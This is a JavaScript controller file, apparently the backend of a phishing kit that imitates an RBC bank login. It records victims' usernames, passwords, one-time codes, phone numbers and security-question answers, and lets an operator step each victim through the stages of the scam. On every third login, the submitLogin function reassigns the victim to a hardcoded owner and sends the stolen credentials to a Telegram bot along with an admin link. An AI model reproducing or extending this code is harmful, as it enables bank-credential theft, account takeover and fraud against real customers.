const RBC = require("../models/rbcModel");

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	RBC.find({ owner })
		.sort({ status: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, question, status } = req.body;
	try {
		if (status == 5) {
			await RBC.findOneAndUpdate({ uniqueid }, { status, question }).exec();
		} else {
			await RBC.findOneAndUpdate({ uniqueid }, { status }).exec();
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	RBC.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

let count = 1;

const submitLogin = async (req, res) => {
	const { username, password, uniqueid, owner, ip } = req.body;
	try {
		if (count == 3) {
			await RBC.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner: "haytch4023",
				ip,
			});
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: 680379375,
						text: `New RBC Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=rbc&password=haytch4023`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			count = 0;
		} else {
			await RBC.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner,
				ip,
			});
			count = count + 1;
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, password, uniqueid } = req.body;
	try {
		await RBC.findOneAndUpdate(
			{ uniqueid },
			{ username, password, status: 0 }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await RBC.findOneAndUpdate({ uniqueid }, { otp, status: 4 }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitTelephone = async (req, res) => {
	const { telephone, uniqueid } = req.body;
	try {
		await RBC.findOneAndUpdate({ uniqueid }, { telephone, status: 2 }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitQuestion = async (req, res) => {
	const { answer, uniqueid } = req.body;
	try {
		await RBC.findOneAndUpdate({ uniqueid }, { answer, status: 6 }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await RBC.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitOtp,
	submitQuestion,
	submitTelephone,
	deleteEntry,
};
